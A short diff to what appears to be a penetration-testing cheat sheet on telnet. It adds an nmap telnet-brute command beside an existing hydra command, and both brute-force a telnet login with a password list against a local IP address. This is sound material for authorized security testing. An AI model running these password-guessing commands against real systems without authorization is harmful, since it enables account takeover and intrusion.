@@ -72,6 +72,7 @@ If you got a **`username`** and need the **`password`** this is the way.
 
 ```bash
 hydra -t 1 -l user -P /opt/techyou.txt telnet://192.168.1.2 -V -F -I
+nmap -p23 --script="telnet-brute" --script-args="user=john,passdb=/opt/techyou.txt,telnet-brute.timeout=8s" 192.168.1.2
 ```
 
 #### Username
